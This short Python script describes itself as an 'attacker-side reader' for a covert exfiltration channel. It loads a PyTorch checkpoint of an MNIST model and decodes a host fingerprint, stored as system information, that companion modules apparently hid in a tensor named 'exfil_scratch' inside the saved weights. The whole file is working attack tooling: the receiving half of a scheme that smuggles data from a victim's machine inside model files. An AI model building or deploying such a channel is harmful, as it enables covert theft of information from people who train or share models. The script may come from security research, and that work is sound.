"""Recover staged host fingerprint from saved weights (attacker-side reader)."""

from __future__ import annotations

import argparse
import json
from pathlib import Path

import torch

from exfil_machine import COUNTER_BITS, _bits_to_int
from sysinfo_payload import decode_json_from_bits


def decode(checkpoint: Path) -> dict:
    blob = torch.load(checkpoint, map_location="cpu", weights_only=False)
    state = blob["model_state_dict"]
    scratch = state["exfil_scratch"].flatten()
    cursor = _bits_to_int(scratch[:COUNTER_BITS])
    bits = scratch[COUNTER_BITS : COUNTER_BITS + cursor]
    return decode_json_from_bits(bits)


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "checkpoint",
        type=Path,
        default=Path("outputs/mnist_cnn_with_exfil.pt"),
        nargs="?",
    )
    args = parser.parse_args()
    record = decode(args.checkpoint)
    print(json.dumps(record, indent=2))


if __name__ == "__main__":
    main()
